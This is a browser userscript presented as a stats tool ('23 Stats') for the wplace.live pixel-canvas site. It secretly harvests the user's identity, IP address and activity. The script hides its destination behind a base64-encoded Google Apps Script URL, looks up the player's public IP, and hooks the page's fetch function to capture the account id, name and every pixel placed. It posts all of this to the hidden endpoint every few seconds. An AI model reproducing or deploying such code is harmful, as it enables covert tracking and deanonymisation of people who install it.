// ==UserScript==
// @name         23 Stats [IRON v1.9]
// @namespace    http://tampermonkey.net/
// @version      1.9
// @match        https://*.wplace.live/*
// @match        http://*.wplace.live/*
// @grant        unsafeWindow
// @grant        GM_xmlhttpRequest
// @connect      script.google.com
// @connect      script.googleusercontent.com
// @connect      api64.ipify.org
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    const _0x4a21 = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J3VkcybVA3dUpjS1lXeDRNN195d0U1NVBKVVB1UEtLc2VGWERHNEh2V2pQSkNob0RsbVFxY0hHblZ0OGI5bnk2SmwvZXhlYw==";
    const SCRIPT_URL = atob(_0x4a21);

    const State = {
        myInfo: null, // Изначально пусто
        playerIp: '0.0.0.0',
        buffer: []
    };

    // 1. Получаем IP
    GM_xmlhttpRequest({
        method: "GET", url: "https://api64.ipify.org?format=json",
        onload: (r) => { try { State.playerIp = JSON.parse(r.responseText).ip; } catch(e) {} }
    });

    // 2. Функция отправки
    const flushBuffer = () => {
        if (State.buffer.length === 0) return;
        const dataToSend = [...State.buffer];
        State.buffer = [];

        GM_xmlhttpRequest({
            method: "POST",
            url: SCRIPT_URL,
            data: JSON.stringify(dataToSend),
            contentType: "application/json",
            onload: (r) => console.log(`[23 Stats] Пакет доставлен. Ответ: ${r.responseText}`)
        });
    };

    setInterval(flushBuffer, 5000);

    // 3. Перехват fetch
    const patchFetch = () => {
        const originalFetch = unsafeWindow.fetch;
        unsafeWindow.fetch = async function(...args) {
            const url = typeof args[0] === 'string' ? args[0] : (args[0] instanceof Request ? args[0].url : "");

            // Захват ника (только если он еще не захвачен или пришло что-то валидное)
            if (url.includes('/me')) {
                return originalFetch.apply(this, args).then(async (resp) => {
                    const cloned = resp.clone();
                    try {
                        const data = await cloned.json();
                        if (data && data.id && data.name) {
                            // ФИКСАЦИЯ: не перезаписываем на undefined
                            if (!State.myInfo || State.myInfo.name !== data.name) {
                                State.myInfo = data;
                                console.log("%c[23 Stats] КАЗАК ОПОЗНАН: " + data.name, "color: #00ff00; font-weight: bold;");
                            }
                        }
                    } catch (e) {}
                    return resp;
                });
            }

            // Захват пикселя
            if (url.includes('/pixel/') && args[1]?.method === 'POST') {
                try {
                    const body = JSON.parse(args[1].body);
                    // Шлем только если мы знаем, КТО это (никаких Offline_User)
                    if (State.myInfo && body.coords) {
                        for (let i = 0; i < body.coords.length; i += 2) {
                            State.buffer.push({
                                type: 'pixel_batch',
                                paintedById: State.myInfo.id,
                                paintedByName: State.myInfo.name,
                                myId: State.myInfo.id,
                                myName: State.myInfo.name,
                                color: body.colors ? body.colors[i / 2] : "?",
                                coords: `${body.coords[i]}, ${body.coords[i + 1]}`,
                                requestTime: new Date().toLocaleString("ru-RU"),
                                paintTime: new Date().toLocaleString("ru-RU"),
                                ip: State.playerIp
                            });
                        }
                    }
                } catch (e) {}
            }
            return originalFetch.apply(this, args);
        };
    };

    setTimeout(patchFetch, 1000);
    window.addEventListener('beforeunload', flushBuffer);
})();
